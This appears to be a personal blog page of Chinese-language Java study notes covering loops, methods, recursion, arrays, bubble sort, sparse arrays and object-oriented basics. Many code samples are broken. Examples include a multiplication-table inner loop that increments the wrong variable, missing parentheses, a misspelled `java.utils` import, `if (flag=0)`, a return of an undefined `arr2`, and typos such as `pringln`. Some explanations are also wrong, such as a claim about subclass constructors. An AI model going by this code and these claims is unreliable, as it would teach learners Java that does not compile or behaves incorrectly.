<h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化//条件判断//迭代</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">	<span class="comment">//语句</span></span><br><span class="line">	<span class="comment">//break</span></span><br><span class="line">	<span class="comment">//bontinue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化可为空，条件判断可为空,迭代可为空，当三者均为空使为死循环。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="例：九九乘法表"><a href="#例：九九乘法表" class="headerlink" title="例：九九乘法表"></a>例：九九乘法表</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++)&#123; <span class="comment">//行</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;i++)&#123; <span class="comment">//列</span></span><br><span class="line">				System.out.print(i+<span class="string">&quot;x&quot;</span>+j+<span class="string">&quot;=&quot;</span>+(i*j)+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">				System.out.println();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例：打印等腰三角形"><a href="#例：打印等腰三角形" class="headerlink" title="例：打印等腰三角形"></a>例：打印等腰三角形</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i&lt;=<span class="number">5</span>; i++&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">5</span>;j&gt;=i;j--)&#123;</span><br><span class="line">				System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;</span><br><span class="line">				System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;i;j++)&#123;</span><br><span class="line">				System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="增强型for"><a href="#增强型for" class="headerlink" title="增强型for"></a>增强型for</h3><p>主要用于遍历数组与集合</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">int</span>[] num=&#123;<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>&#125;;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> x:num)&#123;</span><br><span class="line">				System.out.println(x);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println();</span><br><span class="line"><span class="comment">//类 对象 方法</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="comment">//主方法</span></span><br><span class="line">		<span class="type">int</span> sum=add(<span class="number">1333</span>,<span class="number">3222</span>);</span><br><span class="line">		System.out.print(sum); <span class="comment">//输出4555</span></span><br><span class="line"></span><br><span class="line">		<span class="type">Test</span> <span class="variable">su</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line">		<span class="type">int</span> sum2=su.sub(<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line">		System.out.print(sum2);<span class="comment">//输出-1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;  <span class="comment">//add方法，加static声明类方法，可以在类中被直接调用</span></span><br><span class="line">		<span class="keyword">return</span> a+b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">substraction</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;  <span class="comment">//sub法，不加static声明实例方法，</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><ol>
<li>方法名称必须相同</li>
<li>参数列表必须不相同（个数不相同，类型不相同，排列顺序不相同）</li>
</ol>
<h2 id="可变传参"><a href="#可变传参" class="headerlink" title="可变传参"></a>可变传参</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="comment">//语句</span></span><br><span class="line">		<span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">		<span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">		<span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">4</span></span><br><span class="line">		<span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">		arg(a,b,c,d);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">arg</span><span class="params">(<span class="type">int</span> a;<span class="type">int</span> b;<span class="type">int</span>... c)</span>&#123; <span class="comment">//不定项参数必须是最后一个参数</span></span><br><span class="line">		<span class="comment">//语句</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>方法自己调用自己，递归必须要有基例，即程序的出口，不然会发生栈溢出。</p>
<p>以阶乘为例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (n==<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> n*test(n-<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//默认初始化，包含在动态初始化中，没有被赋值的元素位将被赋元素类型的默认。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//静态初始化</span></span><br><span class="line"><span class="type">int</span>[] num = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>&#125;; <span class="comment">//建议书写方式</span></span><br><span class="line"><span class="type">int</span> num[] = &#123;<span class="number">55</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,&#125;; <span class="comment">//定义并赋值 c c++ 风格</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//动态初始化 </span></span><br><span class="line"><span class="type">int</span>[] nums; <span class="comment">//声明数组</span></span><br><span class="line">nums = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">100</span>]; <span class="comment">//创建一个容量为100的数组</span></span><br><span class="line">nums[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">nums[<span class="number">1</span>]=<span class="number">34</span>; <span class="comment">//为数组赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//取值</span></span><br><span class="line">System.out.print(nums[<span class="number">1</span>]); <span class="comment">//从数组取值</span></span><br><span class="line">System.out.print(nums.length); <span class="comment">//获取数组长度。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i:nums)&#123;</span><br><span class="line">	System.out.print(nums[i-<span class="number">1</span>]); <span class="comment">//**注意此处**</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.lenth;i++)&#123;</span><br><span class="line">	System.out.print(nums[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//反转数组</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] reverse(<span class="type">int</span>[] arrays)&#123;</span><br><span class="line">	<span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[arrays.length];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>,j=result.length-<span class="number">1</span>;i&lt;arrays.length;i++,j--)&#123;</span><br><span class="line">		result[i]=arrays[j];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//数组的长度是固定的，定义之后不可改变</span></span><br><span class="line"><span class="comment">//未被赋值的位置的值为该位置预定义类型的默认值。</span></span><br><span class="line"><span class="comment">//数组中必须是相同的数据类型</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">int</span>[][] nums=&#123;&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">1</span>,<span class="number">4</span>&#125;,&#123;<span class="number">45</span>,<span class="number">56</span>&#125;&#125;;</span><br><span class="line">		System.out.pringln(nums[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这种数组里面只能存一种类型的数据，真的是好憋得慌。</span></span><br></pre></td></tr></table></figure>

<h2 id="Arrays对象"><a href="#Arrays对象" class="headerlink" title="Arrays对象"></a>Arrays对象</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.utils.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">int</span>[] a=&#123;<span class="number">1</span>,<span class="number">434</span>,<span class="number">5</span>,<span class="number">63</span>,<span class="number">4223</span>,<span class="number">56</span>,<span class="number">8</span>&#125;;</span><br><span class="line">		System.out.print(a); <span class="comment">//输出hashcode</span></span><br><span class="line">		System.out.print(Arrays.toString(a))<span class="comment">//将数组转换为字符串并打印</span></span><br><span class="line">		Arrays.sort(a)</span><br><span class="line">		System.out.print(a) <span class="comment">//排序</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.utils.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] sor(<span class="type">int</span>[] arrays)&#123;</span><br><span class="line">		<span class="type">int</span> k=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;arrays.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">			<span class="type">int</span> flag=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span> (j=<span class="number">0</span>;j &lt; arrays.length-<span class="number">1</span>-i;j++)&#123;</span><br><span class="line">				<span class="keyword">if</span> (arrays[j]&gt;arrays[j+<span class="number">1</span>])&#123;</span><br><span class="line">						k = arrays[j+<span class="number">1</span>];</span><br><span class="line">						arrays[j+<span class="number">1</span>]=arrays[j];</span><br><span class="line">						arrays[j]=k;</span><br><span class="line">						flag +=<span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (flag=<span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">break</span>;   <span class="comment">//优化算法</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> arrays;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="稀疏数组"><a href="#稀疏数组" class="headerlink" title="稀疏数组"></a>稀疏数组</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//当数组中大部分元素都为0，或者报错着相同的值的时候，可使用稀疏数组要锁数组尺寸</span></span><br><span class="line"><span class="comment">//第一行记录数组的行和列以及有效值的数量，后面的行记录记录每一个有效值的行列以及值</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/archives/3377d36c/Untitled.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//将二维数组转换为稀疏数组</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] sparseArray(<span class="type">int</span>[] arr)&#123;</span><br><span class="line">		<span class="comment">//获取有效值的数量</span></span><br><span class="line">		<span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">		<span class="type">int</span> max=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr.length)&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>;j&lt;arr[i].length;j++)</span><br><span class="line">				<span class="comment">//获取有效值的行数</span></span><br><span class="line">				<span class="keyword">if</span> (arr[i][j] !=<span class="number">0</span>)&#123;</span><br><span class="line">					sum++; </span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">//获取最大的列数</span></span><br><span class="line">				<span class="keyword">if</span> ((arr[i].length&gt;arr[i+<span class="number">1</span>].length) &amp;&amp; i&lt;(arr.length-<span class="number">2</span>))&#123;</span><br><span class="line">					max=arr[i].length;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//创建稀疏数组</span></span><br><span class="line">		<span class="type">int</span>[][] arrSpar = <span class="keyword">new</span> <span class="title class_">int</span>[sum+<span class="number">1</span>][<span class="number">3</span>];</span><br><span class="line">		arrSpar[<span class="number">0</span>][<span class="number">0</span>]=arr.length;</span><br><span class="line">		arrSpar[<span class="number">0</span>][<span class="number">1</span>]=max;</span><br><span class="line">		arrSpar[<span class="number">0</span>][<span class="number">2</span>]=sum;</span><br><span class="line">		<span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> k=<span class="number">0</span>;k&lt;arr.length;k++)&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> l=<span class="number">0</span>;l&lt;arr[k].length;l++)&#123;</span><br><span class="line">				<span class="keyword">if</span> (arr[k][l] !=<span class="number">0</span>)&#123;</span><br><span class="line">					count++;</span><br><span class="line">					arrSpar[count][<span class="number">0</span>]=k;</span><br><span class="line">					arrSpar[count][<span class="number">1</span>]=l;</span><br><span class="line">					arrSpar[count][<span class="number">2</span>]=arr[k][l];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> arr2;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//还原稀疏数组</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] restoreSparseArray(<span class="type">int</span>[][] arrspar)&#123;</span><br><span class="line">			<span class="comment">//语句，明天再写	</span></span><br><span class="line">			<span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[arrspar[<span class="number">0</span>][<span class="number">0</span>]][arrspar[<span class="number">0</span>][<span class="number">1</span>]];</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> h=<span class="number">1</span>;h&lt;arrspar.length;h++)&#123;</span><br><span class="line">				arr[arrspar[h][<span class="number">0</span>]][arrspar[h][<span class="number">1</span>]]=arrspar[h][<span class="number">2</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> arr;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h2 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//堆内存：存放new出来的对象或数组，可以被所有的线程共享，不会存放别的对象的引用</span></span><br><span class="line"><span class="comment">//栈内存：存放基本变量类型（存放变量的具体数值）引用对象的变量（存放这个引用在堆里面的具体地址）</span></span><br><span class="line"><span class="comment">//方法区：可以被所有线程共享，包含了所有的class和static变量</span></span><br><span class="line"><span class="comment">//声明数组时，压栈放入一个数组 此时，数组其实并不存在</span></span><br><span class="line"><span class="comment">//创建数组时，在堆种创建一片空间用以存放数组的值</span></span><br><span class="line"><span class="comment">//赋值数组，将数据放入堆之中</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h1><p><strong>静态方法</strong>-有static关键字，不需要通过对象调用</p>
<p><strong>动态方法</strong>-无static关键字，需要通过对象调用</p>
<p><strong>形参</strong>-函数定义的时候指定的参数，作为占位符使用</p>
<p><strong>实参</strong>-函数调用的时候，实际传入的参数</p>
<p><strong>值传递</strong>-将值复制一份进行传递，函数内部改变参数的值，不会应用外部变量的值。 <strong><code>JAVA中均为值传递</code></strong> </p>
<p><strong>引用传递</strong>-传递值得内存地址，改变函数中的值将同步改变外部该变量的值</p>
<p>同一个文件中可以有多个<code>class</code>，但只能有一个<code>public class</code>  </p>
<p>**构造器：**必须与类名同名，不能有返回值，且没有void。</p>
<p><strong><code>属性封装，类继承，方法重写、多态</code></strong>  </p>
<p><strong>无参构造器</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">//构造方法</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">	&#125;		</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用new的时候必须有构造器</span></span><br></pre></td></tr></table></figure>

<p><strong>有参构造器</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Test</span><span class="params">(String name)</span>&#123;</span><br><span class="line">		<span class="comment">//有参构造，**一旦定义了有参构造，无参就必须显式定义**</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> **extends** Persion&#123;</span><br><span class="line">	<span class="comment">//语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="重写与this、super、多态"><a href="#重写与this、super、多态" class="headerlink" title="重写与this、super、多态"></a>重写与this、super、多态</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//子类重写父类的方法</span></span><br><span class="line"><span class="comment">//重写是发生在父类与子类之间的，重载是发生在同一个类里面的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Parent</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Parent</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;父类无参构造方法&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">protected</span> String name=<span class="string">&quot;woshinibaba&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.print(<span class="string">&quot;father&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Parent</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Son</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">//**此处会调用父类的无参构造方法！！！父类如果定义了有参构造方法，那么子类将不能定义无参构造方法**</span></span><br><span class="line">		System.out.println(<span class="string">&quot;字类无参构造方法&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">private</span> String name=<span class="string">&quot;armandhe&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;&#125;</span><br><span class="line">	<span class="meta">@Override</span>  <span class="comment">//重写 方法名相同，参数列表必须相同，修饰符范围可以扩大，但不可以缩小，抛出异常的范围可以缩小但不可以扩大。</span></span><br><span class="line">							<span class="comment">//public &gt; protected &gt; default &gt; private</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.print(<span class="string">&quot;son&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(String name)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.run(); <span class="comment">//输出son</span></span><br><span class="line">		run(); <span class="comment">//输出son，就近原则</span></span><br><span class="line">		<span class="built_in">super</span>.run(); <span class="comment">//输出father</span></span><br><span class="line">		System.out.pintln(name); <span class="comment">//输出参数中的name</span></span><br><span class="line">		System.out.println(<span class="built_in">this</span>.name); <span class="comment">//输出类变量name</span></span><br><span class="line">		System.out.println(<span class="built_in">super</span>.name); <span class="comment">//输出父类的name</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">Parent</span> <span class="variable">parent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Parent</span>;</span><br><span class="line">		<span class="type">Son</span> <span class="variable">son</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>;</span><br><span class="line">		<span class="type">Parent</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>; **<span class="comment">//注意这种调用方法，实际上是实例化了父类的引用，</span></span><br><span class="line">															 <span class="comment">//在其中可以使用父类的方法与属性，但不可以使用子</span></span><br><span class="line">															 <span class="comment">//类中独有的方法与属性，但可以使用子类中重写的父类的方法。</span></span><br><span class="line">															 <span class="comment">//只针对非静态方法</span></span><br><span class="line">															 <span class="comment">//静态方法不存在重写的概念，静态方法在类被加载的时候就被加载了**</span></span><br><span class="line">		parent.run(); <span class="comment">//输出father</span></span><br><span class="line">		son.run(); <span class="comment">//输出son</span></span><br><span class="line">		son.test(<span class="string">&quot;hjx&quot;</span>); <span class="comment">//分别输出hjx 与 armandhe 与 woshinibaba</span></span><br><span class="line">		test.run(); <span class="comment">//输出son</span></span><br><span class="line">		test.</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Instanceof"><a href="#Instanceof" class="headerlink" title="Instanceof"></a>Instanceof</h2><p>instanceof 判断两个类之间有没有父子关系</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object =&gt; Person =&gt; Student ===object <span class="comment">//实例对象 </span></span><br><span class="line"><span class="type">Student</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>;</span><br><span class="line"><span class="type">Person</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>; </span><br><span class="line">object <span class="keyword">instanceof</span> Student <span class="comment">//上述三种请开给你均为true</span></span><br></pre></td></tr></table></figure>

<h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person obj <span class="keyword">new</span> <span class="title class_">Student</span>;</span><br><span class="line"><span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> (Student)obj <span class="comment">//强制类型转换 高转低 向下转型，可能会丢失一些方法</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> student; <span class="comment">//自动类型转换 低转高 向上转型</span></span><br></pre></td></tr></table></figure>

<h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="comment">//匿名代码块</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">		<span class="comment">//静态代码块</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//执行顺序</span></span><br><span class="line"><span class="comment">//静态代码块在类加载的时候执行，匿名代码块在实例化类的时候执行，再执行构造方法</span></span><br></pre></td></tr></table></figure>

